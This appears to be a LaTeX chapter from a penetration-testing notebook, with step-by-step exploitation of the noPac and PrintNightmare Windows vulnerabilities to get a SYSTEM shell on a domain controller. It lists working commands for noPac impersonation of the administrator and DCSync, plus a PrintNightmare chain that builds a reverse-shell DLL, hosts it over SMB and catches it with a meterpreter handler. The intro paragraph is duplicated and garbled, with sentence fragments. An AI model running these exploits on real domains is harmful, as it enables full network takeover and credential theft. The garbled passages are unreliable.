\chapter{From CVE to SYSTEM shell on DC}

\section{samAccountName spoofing}

\subsection{Intro}
the
\href{https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699}{Sam\_The\_Admin vulnerability}, 
also called \emph{noPac} or  \emph{SamAccountName Spoofing}
released at the end of 2021. 

It encompasses two CVEs 2021-42278 (is a bypass vulnerability with the
SAM) and 2021-42287 (is a vulnerability within the Kerberos
Privilege Attribute Certificate (PAC) in ADDS) , allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. 


This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post.

This exploit path takes advantage of being able to change the
\verb+SamAccountName+ of a computer account to that of a Domain Controller. By
default, authenticated users can add up to

computers to a domain}. When doing so, the name must be  changed to match a
Domain Controller's SamAccountName. Once done,  when a kerberos ticket is
requested  the service  issue a tickets under the DC's name instead of the new
name. When a TGS is requested, it will issue the ticket with the closest
matching name. Once done, this allow to have access as that service and can
even be provided with a SYSTEM shell on a Domain Controller. The flow of the
attack is outlined in detail in this

\href{https://github.com/Ridter/noPac}{noPac tool} allow to perform the attack and rely on Impacket.

\subsection{Exploit}

\begin{verbatim}
# Scanning for noPac
sudo python3 scanner.py DOMAIN.NAME/LOGIN:password -dc-ip IP -use-ldap

# Running NoPac & Getting a Shell
sudo python3 noPac.py DOMAIN.NAME/LOGIN:password -dc-ip IP -dc-host HOST_NAME \
    -shell --impersonate administrator -use-ldap
\end{verbatim}

{\bf note}:
\begin{itemize}
    \item a semi-interactive shell session is established with the target using
        smbexec.py.
    \item TGTi are saved  in the directory on the attack host where the exploit was run.
\end{itemize}

Using the ccache file it is possible to perform a
pass-the-ticket~\ref{kerberos:pth} and perform further attacks such as
DCSync~\ref{kerberos:DCSync}. 

It is possible with the \verb+-dump+ flag to perform a DCSync using
secretsdump.py. This method would still create a ccache file on disk.

\subsection{Windows Defender and SMBEXEC.py Considerations}
If Windows Defender (or another AV or EDR product) is enabled on a target, the
shell session may be established, but issuing any commands will likely fail.
The first thing smbexec.py does is create a service called BTOBTO. Another
service called BTOBO is created, and any command typed is sent to the target
over SMB inside a .bat file called execute.bat. With each new command typed, a
new batch script is created and echoed to a temporary file that executes said
script and deletes it from the system. Let's look at a Windows Defender log to
see what behavior was considered malicious.


\section{PrintNightmare}
\subsection{Intro}
PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and
CVE-2021-1675) found in the
\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc}{Print
Spooler service} that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. 


\subsection{metasploit}
\verb+use exploit/windows/local/ricoh_driver_privesc+
\subsection{Exploit}
\begin{enumerate}
    \item \verb+git clone https://github.com/cube0x0/CVE-2021-1675.git+
    \item verify if \emph{Print System Asynchronous Protocol} and
\emph{Print System Remote Protocol} are exposed on the target.
\begin{verbatim}
\verb+rpcdump.py @DC-IP | egrep 'MS-RPRN|MS-PAR'+
\end{verbatim}

    \item Craft a DLL reverse shell with msfvenom~\ref{tool:metasploit:msfvenom}
    \item host the DLL shell with
        \verb+smbserver+~\ref{tool:impacket:smbserver}
    \item Configuring \& Starting metasploit multi/handler:
\begin{verbatim}
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST IP
set LPORT PORT
run
\end{verbatim}
    \item run the exploit:
\begin{verbatim}
sudo python3 CVE-2021-1675.py DOMAIN.NAME/login:pawword@DC-IP \
    '\\LHOST\PATH\TO\DLL'
\end{verbatim}
    \item Metasploit drop into SYSTEM shell
\begin{verbatim}
shell

\end{verbatim}
\end{enumerate}
